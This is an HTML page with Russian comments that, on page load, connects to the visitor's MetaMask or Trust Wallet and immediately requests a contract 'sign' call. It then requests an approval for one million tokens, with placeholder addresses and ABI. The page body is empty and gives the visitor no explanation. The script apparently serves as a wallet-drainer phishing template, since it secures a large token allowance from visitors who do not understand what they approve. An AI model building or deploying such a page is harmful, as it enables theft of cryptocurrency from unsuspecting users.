<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Автоматическое Подключение и Подписание Контракта</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            if (typeof window.ethereum !== 'undefined') {
                const web3 = new Web3(window.ethereum);
                try {
                    // Запрос доступа к аккаунту пользователя
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const accounts = await web3.eth.getAccounts();
                    const userAddress = accounts[0];
                    console.log("Подключен аккаунт:", userAddress);

                    // Адрес и ABI вашего контракта
                    const contractAddress = "ВАШ_АДРЕС_КОНТРАКТА";
                    const abi = [ /* Вставьте ABI вашего контракта здесь */ ];

                    // Создание экземпляра контракта
                    const contract = new web3.eth.Contract(abi, contractAddress);

                    // Вызов метода подписания контракта
                    await contract.methods.sign().send({ from: userAddress });
                    console.log("Контракт подписан пользователем:", userAddress);

                    // Адрес токена и сумма для разрешения
                    const tokenAddress = "АДРЕС_ВАШЕГО_ТОКЕНА";
                    const amountToApprove = web3.utils.toWei("1000000", "ether");

                    // Вызов метода approve для предоставления разрешения
                    await contract.methods.approve(tokenAddress, amountToApprove).send({ from: userAddress });
                    console.log("Разрешение предоставлено для контракта:", contractAddress);

                    alert("Контракт успешно подписан, и разрешение предоставлено!");

                } catch (error) {
                    console.error("Ошибка при подключении или подписании:", error);
                }
            } else {
                alert("Trust Wallet или MetaMask не найдены!");
            }
        });
    </script>
</head>
<body>
</body>
</html>
